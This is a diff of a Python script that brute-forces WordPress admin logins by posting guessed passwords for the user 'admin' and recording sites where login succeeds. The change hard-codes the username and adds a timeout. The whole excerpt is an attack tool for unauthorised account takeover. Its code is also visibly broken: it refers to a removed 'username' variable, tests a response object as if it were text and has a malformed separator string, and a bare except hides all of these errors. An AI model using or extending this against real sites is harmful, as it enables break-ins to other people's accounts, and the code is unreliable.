@@ -20,18 +20,20 @@ import requests
 
 found = []
 
-def brute(site, password, username="admin"):
+def brute(site, password):
 	''' Try login to site with username:password '''
 
 	try:
-		payload = {"log": username, "pwd": password}
-		text = requests.post(site, data=payload)
+		payload = {"log": "admin", "pwd": password}
+		text = requests.post(site, data=payload, timeout=5)
 
 		if "dashboard" in text:
 			print "\n"+"-*60"+"[+] Site: %s\n\t[*] Username:%s\n\t[*] Password: %s\n"%(site, username, password) + "-"*60
 			found.append((site, username, password))
+			return
 	except:
-		pass
+		return
+
 
 if __name__ == '__main__':
 	''' When script runs directly '''
